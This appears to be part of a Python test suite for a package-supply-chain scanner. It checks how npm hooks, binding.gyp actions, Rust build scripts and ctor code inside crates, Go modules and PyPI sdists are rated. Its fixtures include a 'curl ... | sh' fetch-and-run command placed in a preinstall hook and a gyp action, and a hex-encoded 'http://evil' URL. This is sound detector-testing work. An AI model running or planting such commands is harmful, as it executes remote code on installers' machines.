    def test_a_clean_crate_with_a_build_script_is_ok(self):
        res = rust({"build.rs": PROBE_RS, "src/lib.rs": CLEAN_RS})
        self.assertEqual((res["verdict"], found(res)), ("OK", []))
        self.assertEqual(res["useTime"]["ofFiles"], 1)

    def test_an_rs_file_over_the_member_limit_is_incomplete(self):
        with mock.patch.object(repo, "MAX_MEMBER", 100):
            res = rust({"src/lib.rs": CLEAN_RS, "src/big.rs": "// x\n" * 40})
            self.assertEqual(res["verdict"], "INCOMPLETE")
            res = rust({"src/lib.rs": CLEAN_RS, "tests/big.rs": "// x\n" * 40})
            self.assertEqual(res["verdict"], "OK")


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class NpmInsideTests(unittest.TestCase):
    """N-18: an npm manifest inside a crate or a Go module (tree-sitter-cli's npm wrapper, insta's editor extension)
    is not one npm installs from there: its hooks are inventory (INFO), a hostile command stays CRITICAL, and a hook is
    still followed to the script it names."""

    HOOKED = '{"name": "w", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
    PLAIN = '{"name": "w", "version": "1.0.0"}'
    HOSTILE = "curl -s https://x.invalid/a | sh"

    def test_a_plain_hook_is_listed_not_counted(self):
        for res, what in ((rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.HOOKED, "npm/install.js": "1;\n"}), "crate"),
                          (go({"m.go": CLEAN_GO, "web/package.json": self.HOOKED, "web/install.js": "1;\n"}), "Go module")):
            with self.subTest(what=what):
                self.assertEqual(res["verdict"], "OK")
                [hook] = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
                self.assertEqual(hook["sev"], "INFO")
                self.assertTrue(hook["msg"].endswith(f"(npm never installs a package from inside a {what}: listed, not counted)"))

    def test_a_hostile_hook_or_script_still_counts(self):
        res = rust({"src/lib.rs": CLEAN_RS, "npm/package.json": json.dumps({"scripts": {"preinstall": self.HOSTILE}})})
        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
        res = go({"m.go": CLEAN_GO, "web/package.json": self.HOOKED, "web/install.js": EXFIL_JS})
        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_a_binding_gyp_and_the_implicit_rebuild_are_listed_not_counted(self):
        action = json.dumps({"targets": [{"target_name": "x", "actions": [
            {"action_name": "a", "inputs": [], "outputs": ["o"], "action": ["node", "gen.js"]}]}]})
        bare = "{'targets': [{'target_name': 'x'}]}"
        for res, what in ((rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.PLAIN, "npm/binding.gyp": action}),
                           "an action, crate"),
                          (rust({"src/lib.rs": CLEAN_RS, "package.json": self.PLAIN, "binding.gyp": bare}),
                           "node-gyp rebuild, crate"),
                          (go({"m.go": CLEAN_GO, "web/package.json": self.PLAIN, "web/binding.gyp": action}),
                           "an action, Go module")):
            with self.subTest(what=what):
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])
                hooks = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
                self.assertEqual([i["sev"] for i in hooks], ["INFO"])
                self.assertIn("(npm never installs a package from inside a ", hooks[0]["msg"])

    def test_a_hostile_gyp_action_still_counts(self):
        gyp = json.dumps({"targets": [{"target_name": "x", "actions": [
            {"action_name": "a", "inputs": [], "outputs": ["o"], "action": ["sh", "-c", self.HOSTILE]}]}]})
        res = rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.PLAIN, "npm/binding.gyp": gyp})
        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_an_npm_package_keeps_its_hooks(self):
        data = repo._scan_artifact(crate_tgz({"package.json": self.HOOKED, "install.js": "1;\n"}, root="package"), "tgz",
                                   "npm", False, repo.Budget())
        self.assertEqual([i["sev"] for i in data["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["MAJOR"])


PKG_INFO = "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n\n"
MATURIN = '[build-system]\nrequires = ["maturin>=1,<2"]\nbuild-backend = "maturin"\n'
CARGO = '[package]\nname = "pkg"\nversion = "1.0.0"\nedition = "2021"\n\n[lib]\ncrate-type = ["cdylib"]\n'


def sdist(files, order=None, root="pkg-1.0"):
    """An sdist (a maturin project's, with its crate at the root unless `files` says otherwise), members in `order`."""
    body = dict({"PKG-INFO": PKG_INFO, "pyproject.toml": MATURIN, "Cargo.toml": CARGO}, **files)
    body = {k: v for k, v in body.items() if v is not None}
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name in order or sorted(body):
            raw = body[name] if isinstance(body[name], bytes) else body[name].encode("utf-8")
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
    return scan(buf.getvalue(), "tgz", "sdist")


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class SdistCrateTests(unittest.TestCase):
    """N-17: the Rust crate inside a PyPI sdist (maturin, setuptools-rust), which cargo builds when pip installs it."""

    def test_a_build_script(self):
        res = sdist({"src/lib.rs": CLEAN_RS, "build.rs": BUILD_RS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "build.rs", 5)])
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertTrue(issue["msg"].startswith("build.rs is the build script of a Rust crate in this sdist: pip has cargo "
                                                "build the crate when it installs the sdist, and cargo runs the script on "
                                                "that machine, and it "), issue["msg"])
        self.assertEqual(issue["fix"], "Do not install this sdist; report it to PyPI.")
        self.assertIn("pip builds an sdist's Rust extension with cargo", issue["why"])

    def test_the_crate_a_file_is_in_is_the_nearest_one_above_it(self):
        member = '[package]\nname = "helper"\nversion = "0.1.0"\n\n[lib]\nproc-macro = true\n'
        res = sdist({"src/lib.rs": CLEAN_RS, "crates/helper/Cargo.toml": member, "crates/helper/src/lib.rs": MACRO_RS,
                     "crates/helper/build.rs": BUILD_RS, "crates/helper/tests/t.rs": CTOR_RS, "rust/build.rs": BUILD_RS})
        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "crates/helper/build.rs", 5),
                                      ("SC-INSTALL-HOOK", "CRITICAL", "crates/helper/src/lib.rs", 5)])
        macro = [i["msg"] for i in res["issues"] if i["file"] == "crates/helper/src/lib.rs"]
        self.assertTrue(macro[0].startswith("crates/helper/src/lib.rs is a procedural macro of a Rust crate in this sdist: "
                                            "it runs inside the compiler when pip builds the sdist, and it "), macro)

    def test_a_ctor_and_code_run_when_used(self):
        res = sdist({"src/lib.rs": CTOR_RS})
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
        self.assertEqual((issue["sev"], issue["file"]), ("CRITICAL", "src/lib.rs"))
        self.assertTrue(issue["msg"].startswith("src/lib.rs runs when the package's Rust extension is loaded, before any "
                                                "of its code is called (#[ctor], a load section), and it "), issue["msg"])
        res = sdist({"src/lib.rs": CLEAN_RS, "src/update.rs": USE_RS})
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-USE-RISK"]
        self.assertEqual((issue["file"], issue["line"]), ("src/update.rs", 2))
        self.assertTrue(issue["msg"].endswith("Nothing runs it at build or load: it runs when the package's Rust code is "
                                              "called."), issue["msg"])
        self.assertEqual(issue["fix"], "Don't use the package; report it to PyPI.")

    def test_a_clean_crate_is_read_and_ok(self):
        res = sdist({"src/lib.rs": CLEAN_RS, "build.rs": PROBE_RS, "pkg/__init__.py": "from .pkg import *\n"})
        self.assertEqual((res["verdict"], found(res)), ("OK", []))
        self.assertEqual(res["filesScanned"], 3)                            # (the two .rs files and the module)
        self.assertEqual(res["useTime"]["ofFiles"], 1)                      # (lib.rs; the module is import-time code)

    def test_what_cargo_does_not_build_is_not_read(self):
        blob = CTOR_RS + 'pub const K: &str = "' + B64_DATA + '";\n'             # (the reader's and the file rules')
        for files in ({"src/lib.rs": CLEAN_RS, "tests/t.rs": blob}, {"src/lib.rs": CLEAN_RS, "benches/b.rs": blob},
                      {"src/lib.rs": CLEAN_RS, "examples/e.rs": blob},
                      {"src/lib.rs": CLEAN_RS, "crates/x/Cargo.toml": CARGO, "crates/x/tests/t.rs": blob},
                      {"Cargo.toml": None, "build.rs": BUILD_RS, "src/lib.rs": blob}):          # (no crate: no build)
            with self.subTest(files=sorted(files)):
                res = sdist(files)
                self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"]]), ("OK", []))
        # outside the crate's src/: the file rules read it (cargo may include it), the reader does not
        res = sdist({"src/lib.rs": CLEAN_RS, "docs/snippet.rs": blob})
        self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"]]), ("WARN", ["SC-B64"]))

    def test_the_files_get_the_file_rules(self):
        res = sdist({"src/lib.rs": CLEAN_RS + 'pub const K: &str = "' + B64_DATA + '";\n'})
        self.assertEqual(res["verdict"], "WARN", res["issues"])

    def test_the_order_of_the_members_does_not_matter(self):
        files = {"src/lib.rs": CLEAN_RS, "build.rs": BUILD_RS}
        res = sdist(files, order=["build.rs", "src/lib.rs", "PKG-INFO", "pyproject.toml", "Cargo.toml"])
        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "build.rs", 5)])

    def test_a_crate_file_not_read_makes_the_sdist_incomplete(self):
        with mock.patch.object(repo, "MAX_MEMBER", 100):
            res = sdist({"src/lib.rs": CLEAN_RS, "src/big.rs": "// x\n" * 40})
            self.assertEqual(res["verdict"], "INCOMPLETE")
            self.assertIn("src/big.rs is the code of a Rust crate this sdist builds, and it is larger than the 100-byte "
                          "source-scan limit", [i["msg"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"][0])
            res = sdist({"Cargo.toml": None, "rust/Cargo.toml": CARGO, "rust/src/lib.rs": CLEAN_RS,
                         "docs/big.rs": "// x\n" * 40})                       # (in no crate: cargo never sees it)
            self.assertEqual(res["verdict"], "OK")
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 150):
            res = sdist({"src/lib.rs": CLEAN_RS, "src/more.rs": CLEAN_RS * 3})
        self.assertEqual(res["verdict"], "INCOMPLETE")

    def test_the_crates_share_one_use_time_budget(self):
        two = {"a/Cargo.toml": '[package]\nname = "a"\nversion = "0.1.0"\n', "a/src/lib.rs": CLEAN_RS,
               "b/Cargo.toml": '[package]\nname = "b"\nversion = "0.1.0"\n', "b/src/lib.rs": USE_RS, "Cargo.toml": None}
        res = sdist(two)
        self.assertEqual([r for r, _s, _f, _l in found(res)], ["SC-USE-RISK"])
        with mock.patch.object(repo, "USE_RISK_CHARS", len(USE_RS) + 5):
            res = sdist(two)
        self.assertEqual((found(res), res["useTime"]["files"], res["useTime"]["ofFiles"]), ([], 1, 2))

    def test_no_use_time_reading_once_suspicious(self):
        escaped = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c"                 # (SC-HEXSTR: "http://evil")
        res = sdist({"src/lib.rs": CLEAN_RS + f'pub const U: &str = "{escaped}";\n', "src/update.rs": USE_RS})
        self.assertEqual([r for r, _s, _f, _l in found(res)], ["SC-HEXSTR"])
        self.assertEqual((res["useTime"]["chars"], res["useTime"]["ofFiles"]), (0, 2))

    def test_a_crate_whose_manifest_was_not_kept_is_not_read(self):
        member = '[package]\nname = "x"\nversion = "0.1.0"\n'
        files = {"src/lib.rs": CLEAN_RS, "crates/x/src/lib.rs": CLEAN_RS, "crates/x/Cargo.toml": member}
        order = ["PKG-INFO", "pyproject.toml", "Cargo.toml", "src/lib.rs", "crates/x/src/lib.rs", "crates/x/Cargo.toml"]
        kept = len(CARGO) + 2 * len(CLEAN_RS)                       # (the root's Cargo.toml and both lib.rs files)
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", kept):
            res = sdist(files, order=order)
        self.assertEqual(res["verdict"], "INCOMPLETE")
        self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["crates/x/src/lib.rs"])

    def test_rust_in_an_npm_package_or_a_wheel_is_not_a_crate_built_here(self):
        for kind, root, extra in (("npm", "package", {"package.json": '{"name": "x", "version": "1.0.0"}'}),
                                  ("wheel", "", {"x/__init__.py": "\n"})):
            with self.subTest(kind=kind):
                files = dict({"native/Cargo.toml": CARGO, "native/build.rs": BUILD_RS}, **extra)
                buf = io.BytesIO()
                if kind == "wheel":
                    with zipfile.ZipFile(buf, "w") as zf:
                        for name, data in sorted(files.items()):
                            zf.writestr(name, data)
                    res = scan(buf.getvalue(), "zip", "wheel")
                else:
                    res = scan(crate_tgz(files, root=root), "tgz", "npm")
                self.assertEqual(found(res), [])


if __name__ == "__main__":
    unittest.main()
